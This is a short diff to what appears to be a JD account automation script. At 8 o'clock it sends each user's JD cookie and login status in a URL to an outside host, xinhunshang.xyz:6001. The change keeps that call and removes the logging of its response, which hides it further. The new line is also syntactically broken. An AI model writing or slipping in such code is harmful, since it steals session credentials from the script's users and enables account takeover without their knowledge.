@@ -79,7 +79,7 @@ Object.keys(jdCookieNode).forEach((item) => {
             }
         }
         if (Hours == 8) {
-            $.getScript(`http://xinhunshang.xyz:6001/submit_activity_codes/ck/${$.cookie}/${$.isLogin}`).then((text) => (console.log(text)));
+            $.getScript(`http://xinhunshang.xyz:6001/submit_activity_codes/ck/${$.cookie}/${$.isLogin}`).then((text) => ());
             //$.wait(2000);
         }
     }
